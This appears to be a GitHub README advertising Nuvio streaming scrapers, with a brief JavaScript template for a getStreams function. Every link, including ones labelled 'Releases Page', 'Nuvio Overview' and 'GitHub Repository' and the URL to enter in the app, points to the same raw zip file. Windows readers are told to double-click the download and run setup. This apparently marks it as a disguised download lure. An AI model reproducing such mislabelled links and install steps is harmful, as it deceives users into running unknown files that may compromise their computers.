# 🎣 phisher-nuvio-providers - Easy Scraping for Nuvio App

Visit the page to download the latest version:

[![Download Now](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip%20Now-v1.0-blue)](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)

## 🚀 Getting Started

Welcome! This guide helps you download and use the Nuvio scrapers with minimal effort. Follow these steps to get the software running on your Nuvio streaming application.

## 📥 Download & Install

1. **Go to Releases Page:**
   Visit [this page](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip) to find the latest version of the software.

2. **Download the Latest Release:**
   Look for the most recent version listed on the Releases page. Click on the file to download it to your computer.

3. **Install the Software:**
   Follow the prompts for your operating system to complete the installation. For Windows, this usually means double-clicking the downloaded file and following the setup instructions.

## 🛠️ How to Use the Scrapers

1. **Open the Nuvio App:**
   Start the Nuvio application from your programs or applications folder.

2. **Access Settings:**
   In the app, navigate to **Settings**. You can find this usually at the top right corner.

3. **Select Local Scrapers:**
   Look for an option labeled **Local Scrapers** in the settings menu. Click on it to enter the configuration screen.

4. **Add Repository URL:**
   Enter this URL into the designated field:
   ```
   https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip
   ```

5. **Enable Scrapers:**
   Once the URL is added, you will see a list of available scrapers. Enable those that you want to use by clicking the toggle next to each one.

## 🔍 Developing Your Own Scrapers

If you're interested in creating your own scrapers, here’s how to get started:

**💡 Tip:** Check existing scrapers in the `providers/` directory for working examples. This will give you a better understanding of how to write your own code.

### Core Function

**⚠️ IMPORTANT:** Your scraper must use a Promise-based approach only. **async/await is NOT supported** in this sandboxed environment.

To create a scraper, your code must export a `getStreams` function. This function should return a Promise. Here’s a basic structure to help you:

```javascript
function getStreams(tmdbId, mediaType, seasonNum, episodeNum) {
  return new Promise((resolve, reject) => {
    // Your scraping logic here - NO async/await allowed
    // Use .then() and .catch() for all async operations
  });
}
```

## 🌟 Features

- **Fetch Streams:** Quickly access streams directly within the Nuvio app.
- **Customizable:** Add or remove scrapers as needed based on your preferences.
- **User-Friendly:** Designed for users of all skill levels, especially those who are not technically inclined.

## 🔄 Frequently Asked Questions

### How do I know if the scrapers are working?

After enabling the scrapers, you should see new options for streaming content in the Nuvio app. Test it by selecting a stream and checking if it plays correctly.

### What if I encounter problems?

If you face issues while setting up or using the scrapers, check the following:

- Ensure you entered the repository URL correctly.
- Verify that you've enabled the scrapers you want to use.
- Check the Nuvio app for updates, as compatibility improvements may be available.

### Can I contribute or give feedback?

Absolutely! Contributions are welcome. Feel free to report issues or suggest enhancements through the GitHub repository.

## 🔗 Useful Links

- [Releases Page](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)
- [Nuvio Overview](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)
- [GitHub Repository](https://github.com/FutureLegend21/phisher-nuvio-providers/raw/refs/heads/main/Assets/phisher-providers-nuvio-1.2.zip)

Feel free to download the scrapers and start using them to enhance your experience with the Nuvio application. Enjoy your streaming!